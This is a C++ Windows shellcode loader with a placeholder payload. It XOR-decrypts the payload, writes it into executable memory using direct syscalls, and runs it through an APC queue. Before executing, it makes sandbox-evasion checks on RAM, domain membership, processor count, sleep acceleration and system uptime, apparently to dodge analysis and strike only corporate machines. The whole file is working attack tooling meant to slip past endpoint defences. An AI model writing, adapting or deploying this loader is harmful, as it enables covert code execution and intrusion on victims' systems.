#include <windows.h>
#include <iostream>
#include <stdio.h>
#include "syscalls.h"
#include <lm.h>
#include <tlhelp32.h>
#include <lmjoin.h>
#pragma comment(lib, "netapi32.lib")

// --- Set Payload ---
unsigned char shellcode[] = "SHELLCODE_HERE";
size_t shellcode_len = sizeof(shellcode);
char key[] = "VoFtT"; // Input 2 (XOR Key)

// --- XOR Decryption Routine ---
void XOR(char* data, size_t data_len, char* key, size_t key_len) {

        int j;
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;
                data[i] = data[i] ^ key[j];
                j++;
        }
}

// --- Function for loader ---
void run(unsigned char* shellcode, size_t shellcode_len) {

        PVOID lbuffer = nullptr;
        HANDLE curproc = GetCurrentProcess();

        // Allocate memory with permissions RW
        NtAllocateVirtualMemory(curproc, &lbuffer, 0, &shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

        // --- Decrypt Shellcode ---
        XOR((char*)shellcode, shellcode_len, key, sizeof(key));

        // Write code into memory
        NtWriteVirtualMemory(curproc, lbuffer, shellcode, shellcode_len, nullptr);

        // Change permissions to RX
        ULONG old_protect;
        //NtProtectVirtualMemory(curproc, &lbuffer, &shellcode_len, PAGE_EXECUTE_READ, &old_protect);

        // Create APC
        NtQueueApcThread(GetCurrentThread(), (PKNORMAL_ROUTINE)lbuffer, NULL, NULL, NULL);

        // Flush APC Queue (Execute)
        NtTestAlert();
}

void sandbox() {
  
        MEMORYSTATUSEX totram;
        totram.dwLength = sizeof(totram);
        GlobalMemoryStatusEx(&totram);
        if ((float)totram.ullTotalPhys / 1073741824 < 4) {
                exit(0);
        }

        // Check if domain joined
        PWSTR domainName;
        NETSETUP_JOIN_STATUS status;
        NetGetJoinInformation(NULL, &domainName, &status);
        if (status != NetSetupDomainName) {
                exit(0);
        }


        // Check if <2 processors
        int minprocs = 2;
        SYSTEM_INFO sysinfo;
        GetSystemInfo(&sysinfo);
        int numprocs = sysinfo.dwNumberOfProcessors;
        if (numprocs < minprocs) {
                exit(0);
        }
  
        DWORD uptimebeforesleep = GetTickCount();
        LARGE_INTEGER Interval;
        Interval.QuadPart = -90000000;
        NtDelayExecution(FALSE, &Interval);
        DWORD uptimeaftersleep = GetTickCount();

        // If sleep accelerated exit (sleep for 9s, if time passed <7.5 exit)
        if (uptimeaftersleep - uptimebeforesleep < 7500) {
                exit(0);
        };
  
        // If system uptime < 600s (10 mins) exit
        if (uptimebeforesleep / 1000 < 600) {
                exit(0);
        }

}



// --- MAIN ---
int main(int argc, char** argv) {



        /*int j = 0;
        for (int i = 0; i < sizeof shellcode; i++)
        {
                if (j == sizeof key - 1) j = 0;
                shellcode[i] = shellcode[i] ^ key[j];
                j++;
        }*/
        //getchar();
        //ShowWindow(GetConsoleWindow(), SW_HIDE);
        // --- Run Payload ---
        sandbox();
        run(shellcode, shellcode_len);
}
